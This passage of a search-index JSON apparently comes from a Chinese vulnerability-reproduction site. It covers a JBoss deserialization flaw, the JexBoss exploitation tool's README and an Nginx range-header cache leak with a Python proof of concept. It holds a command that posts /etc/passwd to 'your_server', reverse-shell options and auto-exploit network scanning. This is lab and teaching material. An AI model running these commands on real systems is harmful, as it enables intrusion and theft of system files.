2181","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2017-7504/","text":"JBoss 4.x JBossMQ JMS \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2017-7504 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Red Hat JBoss Application Server \u662f\u4e00\u6b3e\u57fa\u4e8eJavaEE\u7684\u5f00\u6e90\u5e94\u7528\u670d\u52a1\u5668\u3002JBoss AS 4.x\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\uff0cJbossMQ\u5b9e\u73b0\u8fc7\u7a0b\u7684JMS over HTTP Invocation Layer\u7684HTTPServerILServlet.java\u6587\u4ef6\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684\u5e8f\u5217\u5316\u6570\u636e\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] JBoss AS 4.x\u53ca\u4e4b\u524d\u7248\u672c \u73af\u5883\u642d\u5efa \u00b6 https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose build docker-compose up -d \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u63a7\u5236\u53f0 \u4f7f\u7528\u5de5\u5177 Jexboss \u8fdb\u884c\u6f0f\u6d1e\u626b\u63cf python3 jexboss.py -host http://192.168.51.133:8080 \u6210\u529f\u5229\u7528\u6f0f\u6d1e\u6267\u884c\u547d\u4ee4","title":"JBoss 4.x JBossMQ JMS \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2017-7504"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2017-7504/#jboss-4x-jbossmq-jms-\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-cve-2017-7504","text":"","title":"JBoss 4.x JBossMQ JMS \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2017-7504"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2017-7504/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Red Hat JBoss Application Server \u662f\u4e00\u6b3e\u57fa\u4e8eJavaEE\u7684\u5f00\u6e90\u5e94\u7528\u670d\u52a1\u5668\u3002JBoss AS 4.x\u53ca\u4e4b\u524d\u7248\u672c\u4e2d\uff0cJbossMQ\u5b9e\u73b0\u8fc7\u7a0b\u7684JMS over HTTP Invocation Layer\u7684HTTPServerILServlet.java\u6587\u4ef6\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u501f\u52a9\u7279\u5236\u7684\u5e8f\u5217\u5316\u6570\u636e\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2017-7504/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] JBoss AS 4.x\u53ca\u4e4b\u524d\u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2017-7504/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose build docker-compose up -d","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/JBoss%204.x%20JBossMQ%20JMS%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2017-7504/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u63a7\u5236\u53f0 \u4f7f\u7528\u5de5\u5177 Jexboss \u8fdb\u884c\u6f0f\u6d1e\u626b\u63cf python3 jexboss.py -host http://192.168.51.133:8080 \u6210\u529f\u5229\u7528\u6f0f\u6d1e\u6267\u884c\u547d\u4ee4","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/","text":"JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool \u00b6 JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc. Requirements \u00b6 Python >= 2.7.x urllib3 ipaddress Installation on Linux\\Mac \u00b6 To install the latest version of JexBoss, please use the following commands: git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 OR: Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip unzip master.zip cd jexboss-master pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 If you are using CentOS with Python 2.6, please install Python2.7. Installation example of the Python 2.7 on CentOS using Collections Software scl: yum -y install centos-release-scl yum -y install python27 scl enable python27 bash Installation on Windows \u00b6 If you are using Windows, you can use the Git Bash to run the JexBoss. Follow the steps below: Download and install Python Download and install Git for Windows After installing, run the Git for Windows and type the following commands: PATH=$PATH:C:\\Python27\\ PATH=$PATH:C:\\Python27\\Scripts git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 Features \u00b6 The tool and exploits were developed and tested for: JBoss Application Server versions: 3, 4, 5 and 6. Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc) The exploitation vectors are: /admin-console tested and working in JBoss versions 5 and 6 /jmx-console tested and working in JBoss versions 4, 5 and 6 /web-console/Invoker tested and working in JBoss versions 4, 5 and 6 /invoker/JMXInvokerServlet tested and working in JBoss versions 4, 5 and 6 Application Deserialization tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters Servlet Deserialization tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an \"Invoker\" in a link) Apache Struts2 CVE-2017-5638 tested in Apache Struts 2 applications Others Videos \u00b6 Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss Exploiting JBoss Application Server with JexBoss Exploiting Apache Struts2 (RCE) with Jexboss (CVE-2017-5638) Screenshots \u00b6 Simple usage examples: $ python jexboss.py Example of standalone mode against JBoss: $ python jexboss.py -u http://192.168.0.26:8080 Usage modes: $ python jexboss.py -h Network scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt Network scan with auto-exploit mode: $ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt Results and recommendations: Reverse Shell (meterpreter integration) \u00b6 After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command: jexremote=YOUR_IP:YOUR_PORT Example: Shell>jexremote=192.168.0.10:4444 Example: When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute. Usage examples \u00b6 For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server: $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server' For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host): $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name For Java Deserialization Vulnerabilities in a Servlet (like Invoker): $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize For Apache Struts 2 (CVE-2017-5638) $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\" Auto scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log File scan mode: $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log More Options: optional arguments: -h, --help show this help message and exit --version show program's version number and exit --auto-exploit, -A Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!) --disable-check-updates, -D Disable two updates checks: 1) Check for updates performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt -mode {standalone,auto-scan,file-scan} Operation mode (DEFAULT: standalone) --app-unserialize, -j Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, oldFormData, etc) --servlet-unserialize, -l Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces) --jboss Check only for JBOSS vectors. --jenkins Check only for Jenkins CLI vector. --jmxtomcat Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be checked by default. --proxy PROXY, -P PROXY Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128) --proxy-cred LOGIN:PASS, -L LOGIN:PASS Proxy authentication credentials (eg -L name:password) --jboss-login LOGIN:PASS, -J LOGIN:PASS JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 (default: admin:admin) --timeout TIMEOUT Seconds to wait before timeout connection (default 3) Standalone mode: -host HOST, -u HOST Host address to be checked (eg. -u http://192.168.0.10:8080) Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER): --reverse-host RHOST:RPORT, -r RHOST:RPORT Remote host address and port for reverse shell when exploiting Java Deserialization Vulnerabilities in application layer (for now, working only against *nix systems)(eg. 192.168.0.10:1331) --cmd CMD, -x CMD Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server) --windows, -w Specifies that the commands are for rWINDOWS System$ (cmd.exe) --post-parameter PARAMETER, -H PARAMETER Specify the parameter to find and inject serialized objects into it. (egs. -H javax.faces.ViewState or -H oldFormData (<- Hi PayPal =X) or others) (DEFAULT: javax.faces.ViewState) --show-payload, -t Print the generated payload. --gadget {commons-collections3.1,commons-collections4.0,groovy1} Specify the type of Gadget to generate the payload automatically. (DEFAULT: commons-collections3.1 or groovy1 for JenKins) --load-gadget FILENAME Provide your own gadget from file (a java serialized object in RAW mode) --force, -F Force send java serialized gadgets to URL informed in -u parameter. This will send the payload in multiple formats (eg. RAW, GZIPED and BASE64) and with different Content-Types. Auto scan mode: -network NETWORK Network to be checked in CIDR format (eg. 10.0.0.0/8) -ports PORTS List of ports separated by commas to be checked for each host (eg. 8080,8443,8888,80,443) -results FILENAME File name to store the auto scan results File scan mode: -file FILENAME_HOSTS Filename with host list to be scanned (one host per line) -out FILENAME_RESULTS File name to store the file scan results Questions, problems, suggestions and etc: \u00b6 joaomatosf@gmail.com","title":"\u626b\u63cf\u5de5\u5177 Jexboss"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#jexboss---jboss-and-others-java-deserialization-vulnerabilities-verify-and-exploitation-tool","text":"JexBoss is a tool for testing and exploiting vulnerabilities in JBoss Application Server and others Java Platforms, Frameworks, Applications, etc.","title":"JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#requirements","text":"Python >= 2.7.x urllib3 ipaddress","title":"Requirements"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#installation-on-linuxmac","text":"To install the latest version of JexBoss, please use the following commands: git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 OR: Download the latest version at: https://github.com/joaomatosf/jexboss/archive/master.zip unzip master.zip cd jexboss-master pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080 If you are using CentOS with Python 2.6, please install Python2.7. Installation example of the Python 2.7 on CentOS using Collections Software scl: yum -y install centos-release-scl yum -y install python27 scl enable python27 bash","title":"Installation on Linux\\Mac"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#installation-on-windows","text":"If you are using Windows, you can use the Git Bash to run the JexBoss. Follow the steps below: Download and install Python Download and install Git for Windows After installing, run the Git for Windows and type the following commands: PATH=$PATH:C:\\Python27\\ PATH=$PATH:C:\\Python27\\Scripts git clone https://github.com/joaomatosf/jexboss.git cd jexboss pip install -r requires.txt python jexboss.py -h python jexboss.py -host http://target_host:8080","title":"Installation on Windows"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#features","text":"The tool and exploits were developed and tested for: JBoss Application Server versions: 3, 4, 5 and 6. Java Deserialization Vulnerabilities in multiple java frameworks, platforms and applications (e.g., Java Server Faces - JSF, Seam Framework, RMI over HTTP, Jenkins CLI RCE (CVE-2015-5317), Remote JMX (CVE-2016-3427, CVE-2016-8735), etc) The exploitation vectors are: /admin-console tested and working in JBoss versions 5 and 6 /jmx-console tested and working in JBoss versions 4, 5 and 6 /web-console/Invoker tested and working in JBoss versions 4, 5 and 6 /invoker/JMXInvokerServlet tested and working in JBoss versions 4, 5 and 6 Application Deserialization tested and working against multiple java applications, platforms, etc, via HTTP POST Parameters Servlet Deserialization tested and working against multiple java applications, platforms, etc, via servlets that process serialized objets (e.g. when you see an \"Invoker\" in a link) Apache Struts2 CVE-2017-5638 tested in Apache Struts 2 applications Others","title":"Features"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#videos","text":"Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam Applications via javax.faces.ViewState with JexBoss Exploiting JBoss Application Server with JexBoss Exploiting Apache Struts2 (RCE) with Jexboss (CVE-2017-5638)","title":"Videos"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#screenshots","text":"Simple usage examples: $ python jexboss.py Example of standalone mode against JBoss: $ python jexboss.py -u http://192.168.0.26:8080 Usage modes: $ python jexboss.py -h Network scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080 -results results.txt Network scan with auto-exploit mode: $ python jexboss.py -mode auto-scan -A -network 192.168.0.0/24 -ports 8080 -results results.txt Results and recommendations:","title":"Screenshots"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#reverse-shell-meterpreter-integration","text":"After you exploit a JBoss server, you can use the own jexboss command shell or perform a reverse connection using the following command: jexremote=YOUR_IP:YOUR_PORT Example: Shell>jexremote=192.168.0.10:4444 Example: When exploiting java deserialization vulnerabilities (Application Deserialization, Servlet Deserialization), the default options are: make a reverse shell connection or send a commando to execute.","title":"Reverse Shell (meterpreter integration)"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#usage-examples","text":"For Java Deserialization Vulnerabilities in a custom HTTP parameter and to send a custom command to be executed on the exploited server: $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name --cmd 'curl -d@/etc/passwd http://your_server' For Java Deserialization Vulnerabilities in a custom HTTP parameter and to make a reverse shell (this will ask for an IP address and port of your remote host): $ python jexboss.py -u http://vulnerable_java_app/page.jsf --app-unserialize -H parameter_name For Java Deserialization Vulnerabilities in a Servlet (like Invoker): $ python jexboss.py -u http://vulnerable_java_app/path --servlet-unserialize For Apache Struts 2 (CVE-2017-5638) $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 For Apache Struts 2 (CVE-2017-5638) with cookies for authenticated resources $ python jexboss.py -u http://vulnerable_java_struts2_app/page.action --struts2 --cookies \"JSESSIONID=24517D9075136F202DCE20E9C89D424D\" Auto scan mode: $ python jexboss.py -mode auto-scan -network 192.168.0.0/24 -ports 8080,80 -results report_auto_scan.log File scan mode: $ python jexboss.py -mode file-scan -file host_list.txt -out report_file_scan.log More Options: optional arguments: -h, --help show this help message and exit --version show program's version number and exit --auto-exploit, -A Send exploit code automatically (USE ONLY IF YOU HAVE PERMISSION!!!) --disable-check-updates, -D Disable two updates checks: 1) Check for updates performed by the webshell in exploited server at http://webshell.jexboss.net/jsp_version.txt and 2) check for updates performed by the jexboss client at http://joaomatosf.com/rnp/releases.txt -mode {standalone,auto-scan,file-scan} Operation mode (DEFAULT: standalone) --app-unserialize, -j Check for java unserialization vulnerabilities in HTTP parameters (eg. javax.faces.ViewState, oldFormData, etc) --servlet-unserialize, -l Check for java unserialization vulnerabilities in Servlets (like Invoker interfaces) --jboss Check only for JBOSS vectors. --jenkins Check only for Jenkins CLI vector. --jmxtomcat Check JMX JmxRemoteLifecycleListener in Tomcat (CVE-2016-8735 and CVE-2016-8735). OBS: Will not be checked by default. --proxy PROXY, -P PROXY Use a http proxy to connect to the target URL (eg. -P http://192.168.0.1:3128) --proxy-cred LOGIN:PASS, -L LOGIN:PASS Proxy authentication credentials (eg -L name:password) --jboss-login LOGIN:PASS, -J LOGIN:PASS JBoss login and password for exploit admin-console in JBoss 5 and JBoss 6 (default: admin:admin) --timeout TIMEOUT Seconds to wait before timeout connection (default 3) Standalone mode: -host HOST, -u HOST Host address to be checked (eg. -u http://192.168.0.10:8080) Advanced Options (USE WHEN EXPLOITING JAVA UNSERIALIZE IN APP LAYER): --reverse-host RHOST:RPORT, -r RHOST:RPORT Remote host address and port for reverse shell when exploiting Java Deserialization Vulnerabilities in application layer (for now, working only against *nix systems)(eg. 192.168.0.10:1331) --cmd CMD, -x CMD Send specific command to run on target (eg. curl -d @/etc/passwd http://your_server) --windows, -w Specifies that the commands are for rWINDOWS System$ (cmd.exe) --post-parameter PARAMETER, -H PARAMETER Specify the parameter to find and inject serialized objects into it. (egs. -H javax.faces.ViewState or -H oldFormData (<- Hi PayPal =X) or others) (DEFAULT: javax.faces.ViewState) --show-payload, -t Print the generated payload. --gadget {commons-collections3.1,commons-collections4.0,groovy1} Specify the type of Gadget to generate the payload automatically. (DEFAULT: commons-collections3.1 or groovy1 for JenKins) --load-gadget FILENAME Provide your own gadget from file (a java serialized object in RAW mode) --force, -F Force send java serialized gadgets to URL informed in -u parameter. This will send the payload in multiple formats (eg. RAW, GZIPED and BASE64) and with different Content-Types. Auto scan mode: -network NETWORK Network to be checked in CIDR format (eg. 10.0.0.0/8) -ports PORTS List of ports separated by commas to be checked for each host (eg. 8080,8443,8888,80,443) -results FILENAME File name to store the auto scan results File scan mode: -file FILENAME_HOSTS Filename with host list to be scanned (one host per line) -out FILENAME_RESULTS File name to store the file scan results","title":"Usage examples"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Jboss/Scan/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%20Jexboss/#questions-problems-suggestions-and-etc","text":"joaomatosf@gmail.com","title":"Questions, problems, suggestions and etc:"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/","text":"Nginx\u8d8a\u754c\u8bfb\u53d6\u7f13\u5b58\u6f0f\u6d1e CVE-2017-7529 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Nginx\u5728\u53cd\u5411\u4ee3\u7406\u7ad9\u70b9\u7684\u65f6\u5019\uff0c\u901a\u5e38\u4f1a\u5c06\u4e00\u4e9b\u6587\u4ef6\u8fdb\u884c\u7f13\u5b58\uff0c\u7279\u522b\u662f\u9759\u6001\u6587\u4ef6\u3002\u7f13\u5b58\u7684\u90e8\u5206\u5b58\u50a8\u5728\u6587\u4ef6\u4e2d\uff0c\u6bcf\u4e2a\u7f13\u5b58\u6587\u4ef6\u5305\u62ec\u201c\u6587\u4ef6\u5934\u201d+\u201cHTTP\u8fd4\u56de\u5305\u5934\u201d+\u201cHTTP\u8fd4\u56de\u5305\u4f53\u201d\u3002\u5982\u679c\u4e8c\u6b21\u8bf7\u6c42\u547d\u4e2d\u4e86\u8be5\u7f13\u5b58\u6587\u4ef6\uff0c\u5219Nginx\u4f1a\u76f4\u63a5\u5c06\u8be5\u6587\u4ef6\u4e2d\u7684\u201cHTTP\u8fd4\u56de\u5305\u4f53\u201d\u8fd4\u56de\u7ed9\u7528\u6237\u3002 \u5982\u679c\u6211\u7684\u8bf7\u6c42\u4e2d\u5305\u542bRange\u5934\uff0cNginx\u5c06\u4f1a\u6839\u636e\u6211\u6307\u5b9a\u7684start\u548cend\u4f4d\u7f6e\uff0c\u8fd4\u56de\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\u3002\u800c\u5982\u679c\u6211\u6784\u9020\u4e86\u4e24\u4e2a\u8d1f\u7684\u4f4d\u7f6e\uff0c\u5982(-600, -9223372036854774591)\uff0c\u5c06\u53ef\u80fd\u8bfb\u53d6\u5230\u8d1f\u4f4d\u7f6e\u7684\u6570\u636e\u3002\u5982\u679c\u8fd9\u6b21\u8bf7\u6c42\u53c8\u547d\u4e2d\u4e86\u7f13\u5b58\u6587\u4ef6\uff0c\u5219\u53ef\u80fd\u5c31\u53ef\u4ee5\u8bfb\u53d6\u5230\u7f13\u5b58\u6587\u4ef6\u4e2d\u4f4d\u4e8e\u201cHTTP\u8fd4\u56de\u5305\u4f53\u201d\u524d\u7684\u201c\u6587\u4ef6\u5934\u201d\u3001\u201cHTTP\u8fd4\u56de\u5305\u5934\u201d\u7b49\u5185\u5bb9\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Nginx version 0.5.6 - 1.13.2 \u73af\u5883\u642d\u5efa \u00b6 git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8080 \u6b63\u5e38\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528\u76ee\u5f55\u4e0b\u7684POC\u8fdb\u884c\u9a8c\u8bc1 python poc.py http://xxx.xxx.xxx.xxx:8080/ \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/env python import sys import requests if len ( sys . argv ) < 2 : print ( \" %s url\" % ( sys . argv [ 0 ])) print ( \"eg: python %s http://your-ip:8080/\" % ( sys . argv [ 0 ])) sys . exit () headers = { 'User-Agent' : \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\" } offset = 605 url = sys . argv [ 1 ] file_len = len ( requests . get ( url , headers = headers ) . content ) n = file_len + offset headers [ 'Range' ] = \"bytes=- %d ,- %d \" % ( n , 0x8000000000000000 - n ) r = requests . get ( url , headers = headers )","title":"Nginx\u8d8a\u754c\u8bfb\u53d6\u7f13\u5b58\u6f0f\u6d1e CVE-2017-7529"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/#nginx\u8d8a\u754c\u8bfb\u53d6\u7f13\u5b58\u6f0f\u6d1e-cve-2017-7529","text":"","title":"Nginx\u8d8a\u754c\u8bfb\u53d6\u7f13\u5b58\u6f0f\u6d1e CVE-2017-7529"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Nginx/Nginx%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%20CVE-2017-7529/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Nginx\u5728\u53cd\u5411\u4ee3\u7406\u7ad9\u70b9\u7684\u65f6\u5019\uff0c\u901a\u5e38\u4f1a\u5c06\u4e00\u4e9b\u6587\u4ef6\u8fdb\u884c\u7f13\u5b58\uff0c\u7279\u522b\u662f\u9759\u6001\u6587\u4ef6\u3002\u7f13\u5b58\u7684\u90e8\u5206\u5b58\u50a8\u5728\u6587\u4ef6\u4e2d\uff0c\u6bcf\u4e2a\u7f13\u5b58\u6587\u4ef6\u5305\u62ec\u201c\u6587\u4ef6\u5934\u201d+\u201cHTTP\u8fd4\u56de\u5305\u5934\u201d+\u201cHTTP\u8fd4\u56de\u5305\u4f53\u201d\u3002\u5982\u679c\u4e8c\u6b21\u8bf7\u6c42\u547d\u4e2d\u4e86\u8be5\u7f13\u5b58\u6587\u4ef6\uff0c\u5219Nginx\u4f1a\u76f4\u63a5\u5c06\u8be5\u6587\u4ef6\u4e2d\u7684\u201cHTTP\u8fd4\u56de\u5305\u4f53\u201d\u8fd4\u56de\u7ed9\u7528\u6237\u3002 \u5982\u679c\u6211\u7684\u8bf7\u6c42\u4e2d\u5305\u542bRange\u5934\uff0cNginx\u5c06\u4f1a\u6839\u636e\u6211\u6307\u5b9a\u7684start\u548cend\u4f4d\u7f6e\uff0c\u8fd4\u56de\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\u3002\u800c\u5982\u679c\u6211\u6784\u9020\u4e86\u4e24\u4e2a\u8d1f\u7684\u4f4d\u7f6e\uff0c\u5982(-600, 